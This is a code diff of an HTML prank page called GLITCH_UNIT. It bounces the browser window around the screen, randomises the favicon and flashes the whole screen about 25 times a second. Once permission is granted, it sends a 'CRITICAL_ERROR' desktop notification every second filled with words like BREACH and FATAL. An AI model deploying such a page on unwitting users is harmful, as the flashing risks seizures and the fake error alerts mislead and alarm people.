@@ -3,53 +3,92 @@
 <head>
     <title>GLITCH_UNIT</title>
     <link id="icon" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='white'/></svg>">
+    
     <style>
-        body { background: #000; margin: 0; overflow: hidden; height: 100vh; width: 100vw; }
-        #glitchbox {
-            position: fixed; width: 100%; height: 100%;
-            background: #fff; animation: pulse 0.05s infinite;
+        body { 
+            background: #000; 
+            margin: 0; 
+            overflow: hidden; 
+            height: 100vh; 
+            width: 100vw; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        @keyframes pulse {
+        
+        /* High-speed Glitch Background */
+        #glitch {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 1;
+            animation: flash 0.04s infinite;
+        }
+
+        @keyframes flash {
             0% { background: #fff; clip-path: inset(0 0 0 0); }
             50% { background: #000; clip-path: polygon(10% 0, 90% 0, 100% 100%, 0% 100%); }
             100% { background: #444; clip-path: polygon(50% 0, 100% 50%, 50% 100%, 0 50%); }
         }
-        button { position: fixed; z-index: 99; top: 50%; left: 50%; transform: translate(-50%,-50%); padding: 20px; cursor: pointer; }
+
+        button {
+            position: relative; z-index: 10;
+            padding: 20px; font-family: monospace; 
+            font-weight: bold; cursor: pointer;
+            background: #fff; border: 2px solid #000;
+        }
     </style>
 </head>
-<body onload="autoMove()">
+<body onload="startBouncing()">
 
-    <div id="glitchbox"></div>
-    <button id="spawner" onclick="startSpam()">ACTIVATE NOTIFS</button>
+    <div id="glitch"></div>
+    <button id="authBtn" onclick="enableSpam()">ALLOW NOTIF_SPAM</button>
 
     <script>
-        // 1. Move window to random position automatically
-        function autoMove() {
+        // 1. BOUNCING LOGIC
+        let x = Math.random() * (screen.availWidth - 400);
+        let y = Math.random() * (screen.availHeight - 400);
+        let dx = 12; // Speed X
+        let dy = 12; // Speed Y
+
+        function startBouncing() {
             setInterval(() => {
-                const x = Math.floor(Math.random() * (window.screen.availWidth - 400));
-                const y = Math.floor(Math.random() * (window.screen.availHeight - 400));
+                x += dx;
+                y += dy;
+
+                // Bounce off screen edges
+                if (x + 400 > screen.availWidth || x < 0) dx = -dx;
+                if (y + 400 > screen.availHeight || y < 0) dy = -dy;
+
                 window.moveTo(x, y);
-            }, 600);
+            }, 30);
         }
 
-        // 2. Glitchbox Favicon
+        // 2. ICON GLITCH
         setInterval(() => {
             const p = () => Math.floor(Math.random() * 100);
             document.getElementById('icon').href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
         }, 50);
 
-        // 3. Notification Spammer
-        const words = ["VOID", "NULL", "ERROR", "SIGNAL", "BREACH", "FATAL", "DATA", "LOST", "0x0", "STACK", "CORRUPT"];
-        async function startSpam() {
-            document.getElementById('spawner').style.display = 'none';
-            const perm = await Notification.requestPermission();
-            if (perm === 'granted') {
+        // 3. NOTIFICATION SPAMMER
+        const lexicon = ["VOID", "NULL", "ERROR", "SIGNAL", "BREACH", "FATAL", "DATA", "LOST", "0xFF", "STACK", "CORRUPT"];
+
+        async function enableSpam() {
+            const permission = await Notification.requestPermission();
+            if (permission === 'granted') {
+                document.getElementById('authBtn').style.display = 'none';
+                
                 setInterval(() => {
-                    let count = Math.floor(Math.random() * 10) + 1;
-                    let text = "";
-                    for(let i=0; i<count; i++) text += words[Math.floor(Math.random()*words.length)] + " ";
-                    new Notification("!", { body: text.trim(), silent: true });
-                }, 1000);
+                    // Generate 1-10 random words
+                    let wordCount = Math.floor(Math.random() * 10) + 1;
+                    let sentence = "";
+                    for(let i=0; i < wordCount; i++) {
+                        sentence += lexicon[Math.floor(Math.random() * lexicon.length)] + " ";
+                    }
+
+                    new Notification("CRITICAL_ERROR", { 
+                        body: sentence.trim(),
+                        silent: true 
+                    });
+                }, 1000); // Send every 1 second
             }
         }
     </script>
